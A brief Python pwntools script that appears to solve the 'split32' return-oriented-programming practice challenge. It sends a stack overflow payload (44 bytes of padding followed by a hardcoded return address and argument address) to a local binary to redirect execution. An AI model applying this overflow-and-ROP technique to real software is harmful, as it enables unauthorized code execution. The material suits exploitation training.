# coding: utf-8
from pwn import *
import time
p = process("./split32")
p.sendline(b"A"*44+p32(0x0804861a)+p32(0x0804a030))
time.sleep(1)
print(p.recv())
